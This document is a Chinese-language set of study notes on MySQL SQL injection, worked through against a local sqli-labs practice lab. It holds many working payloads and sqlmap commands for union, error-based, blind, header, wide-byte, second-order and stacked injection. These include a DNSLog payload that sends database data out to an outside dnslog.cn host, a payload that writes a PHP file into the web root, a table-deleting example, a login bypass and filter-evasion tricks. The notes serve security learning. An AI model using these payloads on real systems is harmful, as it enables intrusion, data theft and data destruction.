# 数据库(MySQL)相关注入语句的收集和学习

所谓SQL注入，就是通过把SQL命令插入到 Web表单提交 或 URL 或 页面请求等的查询字符串中，最终达到欺骗服务器执行恶意的SQL命令。

即：将构造的SQL语句插入到正常提交的字符串中，并使服务器将字符串中的命令解析为可执行命令而不是字符串。

SQL注入练习环境（Apache+mysql+php）:

Sqlilabs  https://github.com/Rinkish/Sqli_Edited_Version



## GET Union注入

**1.判断是否存在注入点**

通过在URL中修改对应的ID值，为正常数字，大数字，字符（单引号，双引号，双单引号，括号，反斜杆)来探测URL中是否存在注入点。

判断注入类型：

数字型注入：id=1 返回正常 --> id=2-1 返回正常

字符型注入：id=1 返回正常 --> id=1a 返回正常 

```
http://localhost/sqlilabs/Less-1/?id=1    #正常显示
```

![image-20201130203101671](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201130203101671.png)

```
http://localhost/sqlilabs/Less-1/?id=1'   
//添加单引号后报错,猜测sql语句 SELECT * FROM users WHERE id='1'' LIMIT 0,1
```

![image-20201128231003746](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201128231003746.png)

**2.添加注释（添加的单引号闭合前面的单引号，再用注释符注释掉后面内容）**

```
http://localhost/sqlilabs/Less-1/?id=1'--+        
//后面加上and '1'='1 ,or '1'='1 ,and '1' like '1，or' '=1=' 亦可，闭合单引号
sql语句 SELECT * FROM users WHERE id='1'-- ' LIMIT 0,1
```

![image-20201128231239638](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201128231239638.png)



注释符：在Mysql中常见的注释符表达式：#(%23) 或--空 格或 /**/

内联注释： /*! SQL语句 */ 只有Mysql可以识别，常用来绕过WAF

```
select * from articles where id = -1 /*!union*/ /*!select*/ 1,2,3,4
```

**3.判断字段数量(使用order by 对字段排序)**

```
http://localhost/sqlilabs/Less-1/?id=1' order by 1--+  #对第一列排序，正常
```

......

```
http://localhost/sqlilabs/Less-1/?id=1' order by 4--+  #对第四列排序，报错，表明没有第四列
```

![image-20201128231715638](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201128231715638.png)

即有3个字段

**4.报显示位，id设为查询不到的数据（使用union联合查询，前后的表中要有相同的字段数，然后让左边查询无结果，右边有结果）**

```
http://localhost/sqlilabs/Less-1/?id=-1' union select 1,2,3--+
```

![image-20201128232240296](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201128232240296.png)

**5.查询相关信息**

```
http://localhost/sqlilabs/Less-1/?id=-1' union select 1,database(),3--+  #查询当前数据库
```

![image-20201128233025336](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201128233025336.png)

其他信息 user(),version()...

**6.查询具体信息**

1）查询所有库

```
http://localhost/sqlilabs/Less-1/?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+
```

![image-20201128234024839](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201128234024839.png)

2）查询当前库的所有表

```
http://localhost/sqlilabs/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
```

![image-20201128234247143](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201128234247143.png)

3）查询表中字段

```
http://localhost/sqlilabs/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+
```

引号内 users 转换为十六进制亦可

```
http://localhost/sqlilabs/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+
```

![image-20201128234755093](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201128234755093.png)

**7.查询数据**

```
http://localhost/sqlilabs/Less-1/?id=-1' union select 1,group_concat(id,0x3a,password,0x3a,username),3 from users--+
```

![image-20201128235121970](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201128235121970.png)



**利用Sqlmap测试**

Sqlmap是检测和利用SQL注入漏洞的一款强大工具。

**1.查询库**

```
python sqlmap.py -u "http://localhost/sqlilabs/Less-1/?id=1" --dbs --batch
```

![image-20201129153523160](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201129153523160.png)

**2.查询表**

```
python sqlmap.py -u "http://localhost/sqlilabs/Less-1/?id=1" -D security --tables --batch
```

![image-20201129154040322](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201129154040322.png)

**3.查询字段**

```
python sqlmap.py -u "http://localhost/sqlilabs/Less-1/?id=1" -D security -T users --columns --batch
```

![image-20201129154015859](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201129154015859.png)

**4.查询数据**

```
python sqlmap.py -u "http://localhost/sqlilabs/Less-1/?id=1" -D security -T users -C id,password,username --dump
```

![image-20201129154914063](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201129154914063.png)



**Sqlmap检测过程中的payload**

```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 6535=6535 AND 'MMEg'='MMEg

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(6529,CONCAT(0x5c,0x7162717a71,(SELECT (ELT(6529=6529,1))),0x7176767a71)) AND 'SxoL'='SxoL

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9353 FROM (SELECT(SLEEP(5)))yGeE) AND 'aMBL'='aMBL

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-3115' UNION ALL SELECT NULL,CONCAT(0x7162717a71,0x7372786d534b54684f795a787a4e736962676675516963714d7759496751777a4b41614f57426376,0x7176767a71),NULL-- -
```



## GET 报错注入

在没有数据回显的时候，通过报错来显示具体的信息

1.**floor()函数**

原理：[Mysql报错注入之函数分析](https://blog.csdn.net/shuteer_xu/article/details/104438405)

```
注入公式（Payload为自己想获取内容的脚本）：
and(select 1 from (select count(*),concat(concat(payload),floor(rand(0)*2))x from information_schema.tables group by x)y)
and(select 1 from (select count(*),concat(concat(database(),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)
//暴库
and(select 1 from (select count(*),concat(concat((select concat(table_name) from information_schema.tables where table_schema="security" limit 3,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)
//查询表
and(select 1 from (select count(*),concat(concat((select concat(column_name) from information_schema.columns where table_schema="security" and table_name="users" limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)
//查询字段
and(select 1 from (select count(*),concat(concat((select concat(username,0x7e,password,0x7e) from security.users limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)
//查询字段内容
```

2.**extractvalue()函数**

extractvalue(目标xml文档，xml路径) :对XML文档进行查询的函数

第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

注意：extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位

extractvalue() 函数不支持低版本 mysql

payload：

```
and extractvalue(1,concat(0x7e,(payload),0x7e))
```

**3.updatexml()函数**

updatexml(目标xml文档，xml路径，更新的内容)：对xml文档进行更新的函数

updatexml和上面的extractvlaue函数基本上相差不大，用法也相同

注：高版本的mysql已经修复了该bug

payload：

```
and updatexml(1,concat(0x7e,(payload),0x7e),1)
```



## GET 布尔盲注

在没有报错信息时，根据页面回显情况不同考虑布尔盲注

**1.检测是否存在注入点**

```
http://localhost/sqlilabs/Less-8/?id=1     #页面正常显示
```

![image-20201130203312421](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201130203312421.png)

```
http://localhost/sqlilabs/Less-8/?id=1'    #无报错信息，但不返回"You are in......"
```

![image-20201130203507136](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201130203507136.png)

**2.判断当前数据库的长度**

```
http://localhost/sqlilabs/Less-8/?id=1' and length(database()) > 5--+
```

![image-20201130204339111](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201130204339111.png)

**length(str)**      返回字符串长度

页面显示正常，说明库名长度大于5

```
http://localhost/sqlilabs/Less-8/?id=1' and length(database()) > 10--+
```

![image-20201130204918453](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201130204918453.png)

继续判断库名长度，此页面表示其小于10

缩小范围判断，得出当前库名长度为8

**3.判断当前数据库的第一个字符**

```
http://localhost/sqlilabs/Less-8/?id=1' and ascii(substr(database(),1,1)) = 115--+
```

![image-20201130205353557](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201130205353557.png)

**ASCII(s)**      返回字符串 s 的第一个字符的 ASCII 码

**SUBSTR(s, n, len)**      从字符串 s 的 n 位置截取长度为 len 的子字符串

页面显示正常，说明当前数据库的第一个字符的ascii码是115，对应s

.......更改位置，逐步得出库名security

......以此类推，得出其他数据

**利用burpsuite测试**

对上面第三步进行抓包，使用intruder模块

![image-20201209162311335](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201209162311335.png)

设置payloads

![image-20201209162508699](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201209162508699.png)

start attack

![image-20201209163040562](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201209163040562.png)



## GET 时间盲注

当页面回显内容完全一致，考虑时间盲注

**1.检测是否存在注入点**

```
http://localhost/sqlilabs/Less-9/?id=1' and if(1=0,1,sleep(10))--+
```

![image-20201129174459638](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201129174459638.png)

**if（expression,a,b）**  expression条件为真返回a,条件为假返回b

F12查看network信息，可以看到延迟了10秒，证明存在注入点

**2.判断当前数据库的长度**

```
http://localhost/sqlilabs/Less-9/?id=1' and if(length(database())=8,sleep(10),1)--+
```

![image-20201129175046395](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201129175046395.png)

延迟10秒，说明判断成功，当前数据库长度为8

**3.判断当前数据库的第一个字符**

```
http://localhost/sqlilabs/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,sleep(10),1)--+
```

![image-20201129175759624](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201129175759624.png)

延迟10秒，说明当前数据库的第一个字符的ascii码是115，对应s

.......更改位置，逐步得出库名security

......以此类推，得出其他数据



**Sqlmap下测试**

查询库名

```
python sqlmap.py -u "http://localhost/sqlilabs/Less-8/?id=1" --technique B --dbs --batch   #布尔型盲注
```

```
python sqlmap.py -u "http://localhost/sqlilabs/Less-9/?id=1" --technique T --dbs --batch   #时间盲注
```

payload

```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 1071=1071 AND 'MFtC'='MFtC
```

```
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 5530 FROM (SELECT(SLEEP(5)))VtGF) AND 'VpPN'='VpPN
```

后续步骤与上述Sqlmap测试方法一致

......



## POST 报错注入

**通过SQL的or运算符，构造万能密码，判断是否为注入点**

判断注入点（添加单引号后报错）

![image-20201203161208957](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201203161208957.png)

```
uname=admin' or 1=1--+&passwd=123456 构造万能密码
```

![image-20201202230449498](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201202230449498.png)

判断出注入点之后，就可以利用报错注入,布尔盲注，时间盲注等，获得我们想要的相关信息

如利用报错注入获取当前数据库

```
uname=admin' or extractvalue(1,concat(0x7e,(database()),0x7e))--+&passwd=123456
```

![image-20201202230243117](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201202230243117.png)

......

**利用burp suite测试**

**使用Proxy功能抓包**

![image-20201202230900185](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201202230900185.png)

**使用Repeater功能**

![image-20201202231127632](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201202231127632.png)

**构造万能密码**

![image-20201202231557574](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201202231557574.png)



**利用Sqlmap测试，进行POST注入**

复制Burpsuite截断的HTTP请求数据包到文本文件中，使用**Sqlmap -r 文件路径 -p 指定探测参数**

这里复制数据包至sqlmap目录下的target.txt文件

![image-20201203000201440](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201203000201440.png)

在Sqlmap中指定探测技术使用--technique  BEUSTQ

**--technique E** 基于报错注入

```
python sqlmap.py -r target.txt -p passwd --technique E
```

![image-20201203000800804](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201203000800804.png)

**payload：**

```
Parameter: passwd (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: uname=admin&passwd=123456' AND GTID_SUBSET(CONCAT(0x716a766b71,(SELECT (ELT(7356=7356,1))),0x7176706a71),7356)-- lpbw&submit=Submit
```

其后添加参数以获取其他信息

```
python sqlmap.py -r target.txt -p passwd --technique E --dbs
python sqlmap.py -r target.txt -p passwd --technique E --current-db --current-user --banner
python sqlmap.py -r target.txt -p passwd --technique E -D security --tables
python sqlmap.py -r target.txt -p passwd --technique E -D security -T users --columns
python sqlmap.py -r target.txt -p passwd --technique E -D security -T users -C password,username --dump
```



## POST 布尔、时间盲注

在admin后添加单引号等字符后并无报错信息，考虑盲注

![image-20201203162418352](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201203162418352.png)

```
uname='or (payload)--+&passwd=
uname='=(payload)=' '--+&passwd=
//如 uname='or (length(database())=8)--+&passwd=
uname='=(ascii(substr(database(),1,1))=115)=' '--+&passwd=
```

![image-20201210213730100](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201210213730100.png)

**利用burpsuite抓取数据包**，在存在注入点POST提交的参数后加入判断语句，根据Response的结果获取信息

如下图，判断当前数据库长度是否大于5

![image-20201203164042900](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201203164042900.png)

再判断其长度是否大于10

![image-20201203164228389](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201203164228389.png)

最后判断其长度为8，以此类推，判断其他信息......



同样，也可以进行基于时间的盲注

```
uname='or (if(ascii(substr(database(),1,1))=115,sleep(5),1))--+&passwd=
```

在存在注入点POST提交的参数后添加判断语句，根据响应时间获取信息

![image-20201203170636591](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201203170636591.png)

继续判断

![image-20201203170851871](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201203170851871.png)

最后判断其长度为8，以此类推，判断其他信息......

**利用Sqlmap测试**

同样，这里复制数据包至target.txt,探测技术为--technique B/T



## DNSLog注入

利用场景：

不管是布尔类型盲注还是时间盲注，都需要发送大量的数据包去判断数据，而这很可能会触发WAF的防护，因此导致被封IP。所以，如果条件允许，我们可以结合DNSlog来快速的回显数据。MySQL数据库，通过DNSlog盲注需要用到 load_file() 函数，该函数不仅能加载本地文件，同时也能对URL发起请求。因为需要使用 load_file() 函数，所以需要root权限，并且 secure_file_priv 需要为空。

原理：

我们输入域名之后 ，需要向DNS服务器查询对应的IP地址，DNS服务器在解析的时候会留下记录，产生日志，我们可以通过查看日志来获取相应信息

![image-20201213182240957](D:\document\md\数据库(MySQL)相关注入语句的收集和学习.assets\image-20201213182240957.png)

payload:

```
# 查询当前用户名
http://127.0.0.1/sqlilabs/Less-1/?id=1' and (select load_file(concat('\\\\',(select hex(user())),'.5srmkc.dnslog.cn/abc'))) --+

# 查看当前数据库名
http://127.0.0.1/sqlilabs/Less-1/?id=1' and (select load_file(concat('\\\\',(select database()),'.5srmkc.dnslog.cn/abc'))) --+
```

相关网站：www.dnslog.cn

![image-20201213183240282](D:\document\md\数据库(MySQL)相关注入语句的收集和学习.assets\image-20201213183240282.png)

相关网站：https://www.bejson.com/convert/ox2str/

![image-20201213192730846](D:\document\md\数据库(MySQL)相关注入语句的收集和学习.assets\image-20201213192730846.png)



## HTTP头中的SQL注入

用户提交的参数会被代码中的某些措施进行过滤，但对于HTTP头中提交的内容很有可能就没有进行过滤，如HTTP头中User-Agent、Referer、Cookies等。

**1.HTTP User-Agent 注入**

判断注入点

![image-20201206223156670](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201206223156670.png)

```
' and extractvalue(1,concat(0x7e,(payload),0x7e)) or '1'='1
```

![image-20201206222552051](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201206222552051.png)

**2.HTTP Referer 注入**

注入点在Referer位置

**3.Cookie注入**

```
Cookie: uname=admin' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
```

![image-20201207155137874](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201207155137874.png)

**Sqlmap测试**

在注入点位置处添加*

![image-20201207160206033](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201207160206033.png)

```
python sqlmap.py -r target.txt --level 3 --batch
```

payload:

```
Parameter: Cookie #1* ((custom) HEADER)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin' AND 6901=6901-- FpnT

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: uname=admin' AND GTID_SUBSET(CONCAT(0x71627a7071,(SELECT (ELT(9508=9508,1))),0x71766a7871),9508)-- kWcz

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 6663 FROM (SELECT(SLEEP(5)))sHMZ)-- iCIs

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: uname=-8722' UNION ALL SELECT NULL,NULL,CONCAT(0x71627a7071,0x4f414141466c504c686648564856454869665a68614a4b564d6c4775556f6d6d79464e446f6f7078,0x71766a7871)-- -
```



## 宽字节注入

原理：

大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 `%df\’` =`%df%5c%27`，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 `%df%5c` 是一个宽字符，也就是`縗`，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。

![image-20201213151446003](D:\document\md\数据库(MySQL)相关注入语句的收集和学习.assets\image-20201213151446003.png)

示例：

```
http://127.0.0.1/sqlilabs/Less-33/index.php?id=%df' union select 1,group_concat(username,0x7e,password),3 from users--+
```

![image-20201210204415465](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201210204415465.png)



## 二次注入

原理：

二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。

示例：

在sqlilabs，Less-24中注册用户名为admin'#密码为123的账号

登录用户名 admi’# 并修改密码为123456，结果是用户名为admin的密码被修改了

```
$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
这是上面的数据库更新语句，在用户名为 "admin'#" 时执行的实际是：
$sql = "UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass' ";
```



## 堆叠注入

原理：

在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除

局限性：

堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，在我们的 web 系统中， 因为代码通常只返回一个查询结果， 因此， 堆叠注入第二个语句产生错误或者结果只能被忽略， 我们在前端界面是无法看到返回结果的。因此， 在读取数据时，建议使用union（联合） 注入。 同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的， 例如表
名， 列名等信息

PS：oracle 不能使用堆叠注入， 当有两条语句在同一行时， 直接报错。 无效字符

payload：

```
http://127.0.0.1/sqli-labs/Less-38/index.php ?id=1%27;insert into users(id,username,password) values ('39','less39','hello')--+
```



## Mysql注入读写文件

1.读文件（[MySQL注入load_file常用路径](http://www.cnblogs.com/lcamry/p/5729087.html)）

```
http://127.0.0.1/sqlilabs/Less-1/index.php/?id=-1' union select 1,2,load_file('D:\\1.txt')--+
```

![image-20201130215923264](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201130215923264.png)

2.写文件（写webshell到网站目录）

```
http://127.0.0.1/sqlilabs/Less-7/index.php/?id=-1')) union select 1,'<?php phpinfo(); ?>',3 into outfile 'E:\\web\\apache\\htdocs\\1.php'--+
```

![image-20201130222727784](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201130222727784.png)

**利用Sqlmap读写文件**

--file-read "路径"

--file-write "要写入的内容或所在文件路径" --file-dest "要写入的路径"

1.读文件

```
python sqlmap.py -u "http://127.0.0.1/sqlilabs/Less-7/index.php/?id=1" --file-read "D:\\1.txt"
```

![image-20201130224238087](C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20201130224238087.png)

2.写文件

```
python sqlmap.py -u "http://127.0.0.1/sqlilabs/Less-7/index.php/?id=1" --file-write "E:\\1.txt" --file-dest "E:\\2.txt"
```



## SQL注入绕过手段

**1.大小写绕过**

例如：如果过滤了order，可以使用OrdER来进行绕过

**2.双写绕过**

例如：如果过滤了union，发现union无论大小写都会被替换为空，可以使用UniunionOn

**3.编码绕过**

可以利用URL编码，绕过过滤机制

如，union%250cselect 

**4.内联注释绕过**

内联注释里的内容会被当成SQL语句执行，例如/*!select */

**5.绕过去除注释符的SQL注入**

--+，-- ，# ，等注释符被过滤失效，考虑其他方式，如：

```
http://192.168.77.1/sqlilabs/Less-23/index.php/?id=-1' union select 1,2,'3
http://192.168.77.1/sqlilabs/Less-23/index.php/?id=1' or (extractvalue(1,concat(0x7e,(payload)))) or '
```

**6.绕过过滤and和or的SQL注入**

大小写变形，Or，oR，And，aND等

添加注释，a/**/nd

双写绕过，oorr

利用符号替代，and--&&,or--||

**7.绕过空格过滤**

可使用以下代替空格

%09  TAB 键（水平）

%0b  TAB 键（垂直）

%0a  新建一行

%0c  新的一页

%0d  return 功能

%a0  空格

/* xxx*/  代替空格(利用fuzz得出xxx)

或语句间用括号，如 select(1)from(admin)where(length(passwd))=32







## 参考文章

[mysql盲注（基于时间）](https://blog.csdn.net/DarkHQ/article/details/79274376)

[Mysql报错型注入总结](https://www.cnblogs.com/csyxf/p/10241456.html)

[MYSQL POST型注入详解](https://blog.csdn.net/weixin_45146120/article/details/100186266?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control)

[SQL注入防御绕过——二次注入](https://www.jianshu.com/p/3fe7904683ac)

[SQL注入教程——（四）宽字节注入](https://blog.csdn.net/helloc0de/article/details/76180190)

[SQL Injection8(堆叠注入)——强网杯2019随便注](https://blog.csdn.net/qq_26406447/article/details/90643951)

[【渗透测试】DNSLog注入](https://blog.csdn.net/weixin_44032232/article/details/109262724)

